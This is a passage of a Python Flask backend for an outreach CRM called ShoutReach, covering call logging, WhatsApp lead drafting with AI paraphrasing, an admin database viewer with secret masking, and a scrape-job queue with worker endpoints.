        "conflicts": [{"business_id": c["business_id"], "business_name": c["business_name"],
                       "channels": c["channel_labels"]} for c in conflicts],
    })


@app.route("/api/call-campaigns/<int:cid>/members", methods=["DELETE"])
@login_required
@owned("call_campaign", "cid")
def api_remove_call_campaign_members(cid):
    d = request.json or {}
    ids = d.get("contact_ids") or []
    if not ids:
        return jsonify({"ok": False, "error": "No contacts given"}), 400
    return jsonify({"ok": True,
                    "removed": db.remove_from_call_campaign(cid, ids, owner_id=me())})


@app.route("/api/calls/<int:cid>/reopen", methods=["POST"])
@login_required
@owned("call_lead", "cid")
def api_reopen_call_lead(cid):
    """
    Return a closed-out lead to the queue — the undo for a misclick.

    cid is the business id, matching every other calling route and what the
    queue rows hand back as `.id` — the operator picks a clinic, not a row in
    a table they never see.
    """
    lead = db.get_call_lead_view(cid, owner_id=me())
    if not lead or not lead.get("call_lead_id") or not db.reopen_call_lead(lead["call_lead_id"]):
        return jsonify({"ok": False, "error": "Not found"}), 404
    db.add_log(f"☎ Reopened {lead.get('company') or cid} for calling")
    return jsonify({"ok": True})


@app.route("/api/calls/log", methods=["POST"])
@login_required
def api_log_call():
    """
    Body's `contact_id` is a business id (kept as-is for the frontend, which
    still calls it that). A business dialled for the first time has no
    call_leads row yet, so one is created here rather than requiring it to
    exist upfront.
    """
    d = request.json or {}
    try:
        business_id = int(d.get("contact_id"))
    except (TypeError, ValueError):
        return jsonify({"ok": False, "error": "A contact is required"}), 400
    # The business arrives in the body, so the @owned decorator never saw it.
    # A terminal outcome here sets do_not_contact, which would silently kill
    # another operator's lead on every channel at once.
    require_owned("business", business_id)

    outcome = (d.get("outcome") or "").strip()
    # Looked up in the caller's own vocabulary rather than globally, so a
    # custom outcome belonging to the other operator can't be logged against.
    spec = db.get_call_outcomes(include_archived=True, owner_id=me()).get(outcome)
    if not spec:
        return jsonify({"ok": False, "error": f"Unknown outcome '{outcome}'"}), 400

    next_call_at = (d.get("next_call_at") or "").strip() or None
    if spec["requires_date"] and not next_call_at:
        return jsonify({
            "ok": False,
            "error": f"'{spec['label']}' needs a date and time",
        }), 400
    if next_call_at:
        # Stored as the same 'YYYY-MM-DD HH:MM:SS' shape everything else uses,
        # so the queue's datetime() comparison works.
        next_call_at = next_call_at.replace("T", " ")
        if len(next_call_at) == 16:
            next_call_at += ":00"

    with db.get_db() as conn:
        call_lead_id = db.get_or_create_call_lead(conn, business_id)

    result = db.log_call(call_lead_id, outcome, d.get("notes", ""), next_call_at,
                         call_campaign_id=d.get("call_campaign_id") or None)
    business = db.get_business(business_id)
    label = spec["label"]
    db.add_log(f"☎ {label} — {(business or {}).get('name') or business_id}")
    if result["stopped_email"]:
        db.add_log(f"  ↳ email sequence stopped for {(business or {}).get('name') or business_id}")
    return jsonify({"ok": True, **result})


@app.route("/api/calls/contact/<int:cid>", methods=["GET"])
@login_required
@owned("business", "cid")
def api_call_contact(cid):
    """cid is the business id — see api_log_call."""
    contact = db.get_call_lead_view(cid, owner_id=me())
    if not contact:
        return jsonify({"error": "Not found"}), 404
    return jsonify({
        "contact": contact,
        "history": db.get_call_history(cid, owner_id=me()),
        "touch":   db.get_touch_history(cid),
    })


@app.route("/api/call-script", methods=["GET"])
@login_required
def api_get_call_script():
    return jsonify(db.get_active_call_script(owner_id=me()))


@app.route("/api/call-script", methods=["PUT"])
@login_required
def api_save_call_script():
    """
    Not admin-only: this is the operator's own pitch, in their own words, and
    needing the rights to change global sending rules in order to edit what you
    say on the phone was backwards.
    """
    d = request.json or {}
    script = db.get_active_call_script(owner_id=me())
    sections = d.get("sections")
    if not isinstance(sections, list):
        return jsonify({"ok": False, "error": "sections must be a list"}), 400
    clean = [
        {"title": str(s.get("title", ""))[:120], "body": str(s.get("body", ""))}
        for s in sections if isinstance(s, dict)
    ]
    db.save_call_script(script["id"], d.get("name") or script["name"], clean,
                        owner_id=me())
    return jsonify({"ok": True})


@app.route("/api/calls/<int:cid>/ics", methods=["GET"])
@login_required
@owned("business", "cid")
def api_call_ics(cid):
    """
    A calendar invite for a booked meeting.

    An .ics download rather than a Google Calendar integration: it works with
    every calendar, needs no OAuth consent screen and no refresh tokens to keep
    alive, and the in-app queue already covers callbacks. Real sync is only
    worth building if two-way updates start to matter.
    """
    contact = db.get_call_lead_view(cid, owner_id=me())
    if not contact or not contact.get("next_call_at"):
        return jsonify({"error": "No scheduled time for this contact"}), 404

    try:
        start = datetime.strptime(contact["next_call_at"][:19], "%Y-%m-%d %H:%M:%S")
    except ValueError:
        return jsonify({"error": "Unreadable scheduled time"}), 400
    end = start + timedelta(minutes=30)

    def _esc(text):
        return (str(text or "").replace("\\", "\\\\").replace(",", "\\,")
                .replace(";", "\\;").replace("\n", "\\n"))

    company = contact.get("company") or contact.get("email") or f"Contact {cid}"
    lines = [
        "BEGIN:VCALENDAR", "VERSION:2.0", "PRODID:-//ShoutReach//Calls//EN",
        "CALSCALE:GREGORIAN", "METHOD:PUBLISH", "BEGIN:VEVENT",
        f"UID:shoutreach-call-{cid}-{int(start.timestamp())}@shoutreach",
        f"DTSTAMP:{datetime.utcnow().strftime('%Y%m%dT%H%M%SZ')}",
        f"DTSTART:{start.strftime('%Y%m%dT%H%M%S')}",
        f"DTEND:{end.strftime('%Y%m%dT%H%M%S')}",
        f"SUMMARY:Call — {_esc(company)}",
        f"DESCRIPTION:{_esc('Phone: ' + (contact.get('phone') or 'n/a'))}"
        f"\\n{_esc('Website: ' + (contact.get('website') or 'none'))}",
        "END:VEVENT", "END:VCALENDAR",
    ]
    resp = make_response("\r\n".join(lines) + "\r\n")
    resp.headers["Content-Type"] = "text/calendar; charset=utf-8"
    resp.headers["Content-Disposition"] = f'attachment; filename="call-{cid}.ics"'
    return resp


# ── API: WhatsApp ─────────────────────────────────────────────────────────────
#
# Every route here either reads state or stages one (a signal, a draft, a
# sent-date). None of them can cause a WhatsApp message to be transmitted --
# the operator does that themselves, outside this app, by tapping Send after
# opening the wa.me link the frontend builds from draft_message. If a change
# here ever needs this app to reach WhatsApp on its own, stop and flag it
# rather than build it; see docs/WhatsApp Module Handover.md.

def _wa_arm_position(lead) -> int:
    """
    Which A/B arm this lead already belongs to, as an index.

    Follow-ups look this up rather than re-cycling, so a lead stays with the
    arm its opener came from. Anything unrecognised -- a lead drafted before
    A/B existed, or one whose arm has since been deleted -- falls to the first
    arm, which is the closest thing to "the template" there is.
    """
    label = (lead.get("template_variant") or "").strip()
    return db.WA_ARM_LABELS.index(label) if label in db.WA_ARM_LABELS else 0


@app.route("/api/wa/import", methods=["POST"])
@login_required
def api_wa_import():
    """
    Accepts JSON { "rows": [...], "country": "AE" } or a multipart CSV with a
    'country' form field. `country` is the fallback used for any row that
    doesn't carry its own -- the usual case, since one scrape is normally one
    city/country at a time.
    """
    if request.content_type and "multipart" in request.content_type:
        f = request.files.get("file")
        if not f:
            return jsonify({"ok": False, "error": "No file"}), 400
        raw = f.read(8 * 1024 * 1024 + 1)
        if len(raw) > 8 * 1024 * 1024:
            return jsonify({"ok": False, "error": "CSV too large (max 8 MB)."}), 413
        content = raw.decode("utf-8", errors="replace")
        rows = list(csv.DictReader(io.StringIO(content)))
        default_country = (request.form.get("country") or "").strip().upper()
    else:
        data = request.json or {}
        rows = data.get("rows", [])
        if not isinstance(rows, list):
            return jsonify({"ok": False, "error": "rows must be a list"}), 400
        default_country = (data.get("country") or "").strip().upper()

    if not rows:
        return jsonify({"ok": False, "error": "No rows"}), 400
    if len(rows) > 50_000:
        return jsonify({"ok": False, "error": "Too many rows (max 50,000)."}), 413

    confirmed = bool((request.json or {}).get("confirm_conflicts")) if request.is_json else False
    conflicts = []
    if not confirmed:
        with_identity = [r for r in rows if (r.get("phone") or r.get("email") or "").strip()]
        conflicts = db.find_cross_channel_conflicts(with_identity, channel="whatsapp", owner_id=me())
        if conflicts:
            # Rows are plain dicts (parsed fresh from CSV/JSON), so matched
            # by (phone, company) rather than object identity.
            flagged_keys = {(c["row"].get("phone"), c["row"].get("company")) for c in conflicts}
            rows = [r for r in rows if (r.get("phone"), r.get("company")) not in flagged_keys]

    overlaps = db.find_cross_owner_matches(rows, owner_id=me())
    inserted, business_ids = db.upsert_wa_leads(rows, default_country=default_country,
                                                owner_id=me())
    return jsonify({
        "ok": True, "inserted": inserted, "business_ids": business_ids,
        "overlaps": overlaps,
        "conflicts": [
            {"business_id": c["business_id"], "business_name": c["business_name"],
             "channels": c["channel_labels"], "row": c["row"]}
            for c in conflicts
        ],
    })


@app.route("/api/wa/leads", methods=["GET"])
@login_required
def api_wa_leads():
    status = request.args.get("status")
    limit = min(int(request.args.get("limit", 200)), 1000)
    return jsonify(db.get_wa_leads(status=status, limit=limit, owner_id=me()))


@app.route("/api/wa/summary", methods=["GET"])
@login_required
def api_wa_summary():
    return jsonify(db.get_wa_summary(owner_id=me()))


@app.route("/api/wa/followups-due", methods=["GET"])
@login_required
def api_wa_followups_due():
    days = db.get_wa_followup_days(me())
    due = db.get_wa_followups_due(days=days, owner_id=me())
    # The follow-up template only ever needs the business name, so it's
    # rendered here rather than asking the frontend to duplicate
    # db._render_wa_template's placeholder logic.
    # The follow-up keeps the arm the opener was drafted from, so a lead is
    # worked by one voice the whole way through and the arm's reply rate
    # measures a conversation rather than a mixture.
    followup_arms = db.get_wa_templates(owner_id=me())["followup"]
    for lead in due:
        _label, text = db.pick_wa_arm(followup_arms, _wa_arm_position(lead))
        lead["followup_draft"] = db._render_wa_template(text, {"name": lead["company"]}, "")
    return jsonify(due)


@app.route("/api/wa/leads/<int:wid>/confirm", methods=["POST"])
@login_required
@owned("wa_lead", "wid")
def api_wa_confirm(wid):
    """
    Locks in a signal -- as detected, or corrected by the operator first.
    Nothing downstream (drafting) will touch this lead until this has run.
    """
    d = request.json or {}
    signal_type = (d.get("signal_type") or "").strip()
    signal_detail = (d.get("signal_detail") or "").strip()
    if not signal_detail:
        return jsonify({"ok": False, "error": "A signal detail is required"}), 400
    try:
        db.confirm_wa_signal(wid, signal_type, signal_detail)
    except ValueError as exc:
        return jsonify({"ok": False, "error": str(exc)}), 400
    return jsonify({"ok": True})


# One call, not one per lead: every confirmed-but-undrafted lead's templated
# base message is built first, then handed to the AI provider together for a
# single paraphrase pass. Keeps cost and latency per lead near zero and stays
# well clear of anything resembling a research step per lead.
_WA_PARAPHRASE_PROMPT = """You are helping a small business paraphrase a batch of short WhatsApp opener messages so they don't all read identically to different recipients.

Rules:
- Preserve every factual claim in each message EXACTLY — do not invent, embellish, remove, or soften any detail.
- Keep each message under 300 characters, friendly and casual in tone, no emojis unless the original already has them.
- Return ONLY a JSON array of strings, the same length and in the same order as the input. No markdown fences, no commentary, no extra keys.

Messages:
{messages}"""


@app.route("/api/wa/draft-batch", methods=["POST"])
@login_required
def api_wa_draft_batch():
    """
    Drafts every confirmed-but-undrafted lead in one pass: render the
    template, then one AI call to paraphrase the whole batch for variety. If
    AI is off, unconfigured, or the call fails, every lead still gets its
    plain templated message — drafting must never block on the AI being
    available, it's a variety pass, not the source of the content.
    """
    limit = min(int((request.json or {}).get("limit", 50)), 200)
    leads = db.get_wa_leads_ready_to_draft(limit=limit, owner_id=me())
    if not leads:
        return jsonify({"ok": True, "drafted": 0})

    templates = db.get_wa_templates(owner_id=me())
    # Arms are cycled per signal type, not across the whole batch: a batch that
    # happened to be mostly gap_found would otherwise deal the gap template's
    # arms unevenly and the comparison would be against different sample sizes.
    seen_per_kind = {"gap": 0, "no_gap": 0}
    base_messages, arm_labels = [], []
    for lead in leads:
        kind = "gap" if lead["signal_type"] == "gap_found" else "no_gap"
        label, text = db.pick_wa_arm(templates[kind], seen_per_kind[kind])
        seen_per_kind[kind] += 1
        arm_labels.append(label)
        base_messages.append(db._render_wa_template(
            text, {"name": lead["company"]}, lead["signal_detail"],
        ))

    final_messages = base_messages
    paraphrase_error = None
    try:
        prompt = _WA_PARAPHRASE_PROMPT.format(messages=json.dumps(base_messages))
        raw = _call_configured_ai_text(prompt)
        parsed = json.loads(_strip_code_fence(raw.strip()))
        if isinstance(parsed, list) and len(parsed) == len(base_messages) and all(
            isinstance(m, str) and m.strip() for m in parsed
        ):
            final_messages = parsed
        else:
            paraphrase_error = "AI response shape didn't match — used the plain template instead"
    except ValueError as exc:
        paraphrase_error = str(exc)
    except Exception as exc:
        logging.warning("WhatsApp paraphrase batch failed: %s", exc)
        paraphrase_error = "Paraphrase call failed — used the plain template instead"

    paraphrased = final_messages is not base_messages
    for lead, message, label in zip(leads, final_messages, arm_labels):
        db.save_wa_draft(lead["id"], message, label, paraphrased=paraphrased)

    result = {"ok": True, "drafted": len(leads),
              "variant": "paraphrased" if paraphrased else "template",
              "arms": sorted({a for a in arm_labels if a})}
    if paraphrase_error:
        result["note"] = paraphrase_error
    return jsonify(result)


@app.route("/api/wa/leads/<int:wid>/message", methods=["PUT"])
@login_required
@owned("wa_lead", "wid")
def api_wa_update_message(wid):
    message = ((request.json or {}).get("message") or "").strip()
    if not message:
        return jsonify({"ok": False, "error": "Message cannot be empty"}), 400
    db.update_wa_message(wid, message)
    return jsonify({"ok": True})


@app.route("/api/wa/leads/<int:wid>/sent", methods=["POST"])
@login_required
@owned("wa_lead", "wid")
def api_wa_mark_sent(wid):
    """
    Records that the operator clicked Open in WhatsApp. This is the entire
    "send" surface of this module — nothing here transmits a message, it
    logs that the link was opened, which is all that can be observed from
    outside WhatsApp.
    """
    d = request.json or {}
    kind = d.get("kind", "opener")
    if kind not in ("opener", "followup"):
        return jsonify({"ok": False, "error": "kind must be 'opener' or 'followup'"}), 400
    lead = db.get_wa_lead(wid)
    if not lead:
        return jsonify({"ok": False, "error": "Not found"}), 404
    message = (d.get("message") or lead.get("draft_message") or "").strip()
    db.mark_wa_sent(wid, message, kind=kind,
                    template_variant=lead.get("template_variant", ""),
                    paraphrased=bool(lead.get("paraphrased")))
    return jsonify({"ok": True})


@app.route("/api/wa/leads/<int:wid>/sent-date", methods=["PUT"])
@login_required
@owned("wa_lead", "wid")
def api_wa_correct_sent_date(wid):
    """Manual correction for 'I opened the link but didn't actually send.'"""
    sent_date = (request.json or {}).get("sent_date") or None
    if sent_date:
        sent_date = sent_date.replace("T", " ")
        if len(sent_date) == 16:
            sent_date += ":00"
    db.correct_wa_sent_date(wid, sent_date)
    return jsonify({"ok": True})


@app.route("/api/wa/leads/<int:wid>/replied", methods=["POST"])
@login_required
@owned("wa_lead", "wid")
def api_wa_mark_replied(wid):
    replied = bool((request.json or {}).get("replied", True))
    db.mark_wa_replied(wid, replied)
    return jsonify({"ok": True})


@app.route("/api/wa/leads/<int:wid>/pause", methods=["POST"])
@login_required
@owned("wa_lead", "wid")
def api_wa_set_paused(wid):
    paused = bool((request.json or {}).get("paused", True))
    db.set_wa_paused(wid, paused)
    return jsonify({"ok": True})


@app.route("/api/wa/leads/<int:wid>/move", methods=["POST"])
@login_required
@owned("wa_lead", "wid")
def api_wa_move_lead(wid):
    """The number turned out not to be on WhatsApp — file it under Calling
    or Email instead of losing the lead. See db.move_wa_lead."""
    destination = ((request.json or {}).get("destination") or "").strip()
    try:
        result = db.move_wa_lead(wid, destination)
    except ValueError as exc:
        return jsonify({"ok": False, "error": str(exc)}), 400
    return jsonify({"ok": True, **result})


@app.route("/api/wa/add-existing", methods=["POST"])
@login_required
def api_wa_add_existing():
    """
    Put businesses this operator already has onto WhatsApp.

    Same hold-and-confirm as adding to a call campaign: a clinic already being
    worked on another channel is held back until the operator says yes, so a
    second channel is a decision rather than a side effect.
    """
    d = request.json or {}
    ids = d.get("business_ids") or []
    country = (d.get("country") or "").strip().upper()
    if not ids:
        return jsonify({"ok": False, "error": "No leads selected"}), 400
    if country not in db.WA_COUNTRY_CODES:
        return jsonify({"ok": False, "error": "Pick the country these numbers are in"}), 400

    conflicts = []
    if not d.get("confirm_conflicts"):
        conflicts = db.channel_conflicts_for_businesses(ids, channel="whatsapp", owner_id=me())
        if conflicts:
            flagged = {c["business_id"] for c in conflicts}
            ids = [i for i in ids if int(i) not in flagged]

    counts = (db.add_businesses_to_wa(ids, country, owner_id=me()) if ids
              else {"added": 0, "already": 0, "no_phone": 0, "ruled_out": 0, "opted_out": 0})
    return jsonify({
        "ok": True, **counts,
        "conflicts": [{"business_id": c["business_id"], "business_name": c["business_name"],
                       "channels": c["channel_labels"]} for c in conflicts],
    })


@app.route("/api/wa/templates", methods=["GET"])
@login_required
def api_wa_get_templates():
    payload = db.get_wa_templates(owner_id=me())
    payload["stats"] = db.get_wa_variant_stats(owner_id=me())
    payload["max_arms"] = db.WA_MAX_ARMS
    return jsonify(payload)


@app.route("/api/wa/templates", methods=["PUT"])
@login_required
def api_wa_save_templates():
    """
    Each operator's own copy and their own follow-up interval. Not admin-only:
    these are the words one person sends under their own name, and the interval
    is the rhythm they work at -- neither is anyone else's to set.

    The interval lives here rather than in /api/settings so changing it doesn't
    require the rights to change the global sending rules alongside it.
    """
    d = request.json or {}
    templates = d.get("templates") or {}
    if not isinstance(templates, dict):
        return jsonify({"ok": False, "error": "templates must be an object"}), 400
    for key, value in templates.items():
        arms = [value] if isinstance(value, str) else value
        if not isinstance(arms, list) or not any(
            isinstance(a, str) and a.strip() for a in arms
        ):
            return jsonify({
                "ok": False,
                "error": f"The {key.replace('_', ' ')} template needs at least one message",
            }), 400
    db.save_wa_templates(templates, owner_id=me(), followup_days=d.get("followup_days"))
    return jsonify({"ok": True})


# ── API: Database viewer ───────────────────────────────────────────────────────

_VIEWER_TABLES = [
    "contacts", "campaigns", "enrollments", "sends",
    "steps", "daily_counts", "logs", "settings",
]
# Columns to mask in addition to the settings.value masking handled by _is_secret_key.
_MASKED_COLUMNS = {
    "smtp_accounts": {"smtp_pass", "imap_pass"},
}


@app.route("/api/db/tables")
@admin_required
def api_db_tables():
    result = []
    with db.get_db() as conn:
        for t in _VIEWER_TABLES:
            try:
                count = conn.execute(f"SELECT COUNT(*) FROM {t}").fetchone()[0]
                result.append({"name": t, "count": count})
            except Exception:
                pass
    return jsonify(result)


@app.route("/api/db/table/<name>")
@admin_required
def api_db_table(name):
    if name not in _VIEWER_TABLES:
        return jsonify({"error": "Table not allowed"}), 403

    page     = max(1, int(request.args.get("page", 1)))
    per_page = 50
    offset   = (page - 1) * per_page
    q        = request.args.get("q", "").strip()

    with db.get_db() as conn:
        columns = [
            d[0] for d in
            conn.execute(f"SELECT * FROM {name} LIMIT 0").description
        ]

        sort_col = request.args.get("sort_col", "").strip()
        sort_dir = request.args.get("sort_dir", "desc").lower()
        if sort_dir not in ("asc", "desc"):
            sort_dir = "desc"
        if sort_col in columns:
            order_by = f'"{sort_col}" {sort_dir.upper()}'
        else:
            sort_col = ""
            order_by = "rowid DESC"

        if q:
            conditions = " OR ".join(f'CAST("{col}" AS TEXT) LIKE ?' for col in columns)
            params     = [f"%{q}%" for _ in columns]
            where      = f"WHERE {conditions}"
        else:
            params = []
            where  = ""

        total = conn.execute(
            f"SELECT COUNT(*) FROM {name} {where}", params
        ).fetchone()[0]

        rows = conn.execute(
            f"SELECT * FROM {name} {where} ORDER BY {order_by} LIMIT ? OFFSET ?",
            params + [per_page, offset],
        ).fetchall()

        masked_cols = _MASKED_COLUMNS.get(name, set())
        data = []
        for row in rows:
            r = dict(row)
            if name == "settings" and _is_secret_key(r.get("key") or ""):
                r["value"] = _SECRET_PLACEHOLDER
            for col in masked_cols:
                if col in r and r[col]:
                    r[col] = _SECRET_PLACEHOLDER
            data.append(r)

    return jsonify({
        "columns":  columns,
        "rows":     data,
        "total":    total,
        "page":     page,
        "per_page": per_page,
        "pages":    max(1, (total + per_page - 1) // per_page),
        "sort_col": sort_col,
        "sort_dir": sort_dir,
    })


@app.route("/api/db/table/<name>/export")
@admin_required
def api_db_table_export(name):
    if name not in _VIEWER_TABLES:
        return jsonify({"error": "Table not allowed"}), 403

    with db.get_db() as conn:
        cursor  = conn.execute(f"SELECT * FROM {name} ORDER BY rowid DESC")
        columns = [d[0] for d in cursor.description]
        rows    = cursor.fetchall()

    masked_cols = _MASKED_COLUMNS.get(name, set())
    buf = io.StringIO()
    w   = csv.writer(buf)
    w.writerow(columns)
    for row in rows:
        r = dict(row)
        if name == "settings" and _is_secret_key(r.get("key") or ""):
            r["value"] = _SECRET_PLACEHOLDER
        for col in masked_cols:
            if col in r and r[col]:
                r[col] = _SECRET_PLACEHOLDER
        w.writerow([_no_formula(r.get(col, "")) for col in columns])

    resp = make_response(buf.getvalue())
    resp.headers["Content-Disposition"] = f"attachment; filename={name}.csv"
    resp.headers["Content-Type"] = "text/csv"
    return resp


# ── API: Scheduler status ──────────────────────────────────────────────────────

@app.route("/api/scheduler/status")
def api_scheduler_status():
    return jsonify({"running": scheduler.is_running()})


@app.route("/api/scheduler/trigger", methods=["POST"])
@admin_required
def api_scheduler_trigger():
    # Signal the background scheduler to run on its next wake; do NOT call
    # process_queue() inline — it sleeps up to (max_delay × batch_size) seconds
    # and would hold the HTTP worker open well past gunicorn's timeout.
    scheduler.request_run_now(include_reply_check=False)
    return jsonify({"ok": True, "message": "Queue run requested"})


@app.route("/api/scheduler/run", methods=["POST"])
@admin_required
def api_scheduler_run():
    scheduler.request_run_now(include_reply_check=True)
    return jsonify({"ok": True})


# ── API: Scraper ──────────────────────────────────────────────────────────────

def _job_payload(job: dict) -> dict:
    try:
        logs = json.loads(job.get("logs") or "[]")
    except Exception:
        logs = []
    heartbeat_secs = db._seconds_since(job.get("heartbeat_at"))
    return {
        "job_id":   job["id"],
        "status":   job["status"],
        "progress": job["progress"],
        "total":    job["total"],
        "found":    job["found"],
        "imported": job["imported"],
        "error":    job.get("error") or "",
        "niche":    job["niche"],
        "city":     job["city"],
        "destination": job.get("destination") or "email",
        "country":  job.get("country") or "",
        "logs":     logs[-80:],
        "heartbeat_secs": None if heartbeat_secs is None else int(heartbeat_secs),
    }


@app.route("/api/scraper/status")
def api_scraper_status():
    db.reap_stale_scrape_jobs()
    seen = db.worker_seconds_since_seen()
    payload = {
        "worker_online": seen is not None and seen < db.WORKER_STALE_SECONDS,
        "worker_last_seen": None if seen is None else int(seen),
    }
    job = db.get_active_scrape_job(owner_id=me()) or db.get_latest_scrape_job(owner_id=me())
    if not job:
        payload["status"] = "idle"
        return jsonify(payload)
    payload.update(_job_payload(job))
    return jsonify(payload)


@app.route("/api/scraper/start", methods=["POST"])
@login_required
def api_scraper_start():
    db.reap_stale_scrape_jobs()
    # One worker machine, so one scrape at a time across everybody -- but say
    # whose it is rather than claiming the operator has one running when they
    # don't.
    running = db.get_active_scrape_job(any_owner=True)
    if running:
        mine = running.get("owner_id") == me()
        return jsonify({"ok": False, "error": (
            "A scrape is already queued or running" if mine
            else "Someone else's scrape is running on the worker right now"
        )}), 409

    d           = request.json or {}
    niche       = d.get("niche", "").strip()
    city        = d.get("city", "").strip()
    auto_import = bool(d.get("auto_import", True))
    destination = (d.get("destination") or "email").strip().lower()
    country     = (d.get("country") or "").strip().upper()
    if destination not in db.SCRAPE_DESTINATIONS:
        return jsonify({"ok": False, "error": "Choose where the leads should go"}), 400
    # A WhatsApp link can't be built from a local number without the country,
    # and the city box is free text ("Doha Qatar") -- so it's asked for rather
    # than guessed.
    if destination == "whatsapp" and country not in db.WA_COUNTRY_CODES:
        return jsonify({"ok": False, "error": "Pick the country these numbers are in"}), 400
    try:
        max_results = max(1, min(500, int(d.get("max_results", 50))))
    except (TypeError, ValueError):
        return jsonify({"ok": False, "error": "max_results must be a number"}), 400

    if not niche or not city:
        return jsonify({"ok": False, "error": "Niche and city are required"}), 400

    job_id = db.create_scrape_job(niche, city, max_results, auto_import, owner_id=me(),
                                  destination=destination, country=country)
    seen = db.worker_seconds_since_seen()
    warning = None
    if seen is None or seen >= db.WORKER_STALE_SECONDS:
        # Queue it anyway -- it will run as soon as the worker comes up. But
        # say so, or pressing Start against a dead worker looks like a no-op.
        warning = "Queued, but no worker is connected. Start scraper_worker.py on your machine."
    return jsonify({"ok": True, "job_id": job_id, "warning": warning})


@app.route("/api/scraper/stop", methods=["POST"])
@login_required
def api_scraper_stop():
    job = db.get_active_scrape_job(owner_id=me())
    if job:
        db.flag_scrape_job(job["id"], stop=True)
        if job["status"] == "queued":
            # Never claimed, so no worker will ever see the flag.
            db.update_scrape_job(job["id"], status="stopped", finished=True)
    return jsonify({"ok": True})


@app.route("/api/scraper/resume", methods=["POST"])
@login_required
def api_scraper_resume():
    job = db.get_active_scrape_job(owner_id=me())
    if job:
        db.flag_scrape_job(job["id"], resume=True)
    return jsonify({"ok": True})


# ── API: scrape worker (machine-to-machine, X-API-Key) ────────────────────────

@app.route("/api/scraper/claim", methods=["POST"])
@worker_auth_required
def api_scraper_claim():
    db.touch_worker_seen()      # polling for work is itself a sign of life
    db.reap_stale_scrape_jobs()
    job = db.claim_scrape_job()
    if not job:
        return ("", 204)
    return jsonify({
        "job_id":      job["id"],
        "niche":       job["niche"],
        "city":        job["city"],
        "max_results": job["max_results"],
        "auto_import": bool(job["auto_import"]),
        # Tells the worker whether to hunt for emails at all. Where the rows
        # end up is decided server-side regardless -- see _scraped_for_whatsapp.
        "destination": job.get("destination") or "email",
        "country":     job.get("country") or "",
    })


@app.route("/api/scraper/jobs/<int:job_id>/progress", methods=["POST"])
@worker_auth_required
def api_scraper_progress(job_id):
    db.touch_worker_seen()
    d = request.json or {}
    logs = d.get("logs") or []
    if not isinstance(logs, list):
        logs = []
    control = db.update_scrape_job(
        job_id,
        status=d.get("status"),
        progress=d.get("progress"),
        total=d.get("total"),
        found=d.get("found"),
        imported=d.get("imported"),
        error=d.get("error"),
        new_logs=logs[:100],
        finished=bool(d.get("finished")),
    )
    return jsonify(control)


@app.route("/api/scraper/heartbeat", methods=["POST"])
@worker_auth_required
def api_scraper_heartbeat():
    """Idle check-in so the UI can show the worker as online between jobs."""
    db.touch_worker_seen()
    return jsonify({"ok": True})


# ── Run ───────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print("\n" + "─" * 60)
    print("  📣  ShoutReach")
    print("  ─────────────────────────────────────────────")
    print("  Dashboard: http://localhost:5000")
    print("  Press Ctrl+C to stop")
    print("─" * 60 + "\n")
    # Debug defaults OFF in production. Enable with FLASK_DEBUG=1.
    debug_mode = os.environ.get("FLASK_DEBUG") == "1"
    app.run(
        debug=debug_mode,
        host=os.environ.get("HOST", "127.0.0.1"),
        port=int(os.environ.get("PORT", 5000)),
        use_reloader=debug_mode,
    )
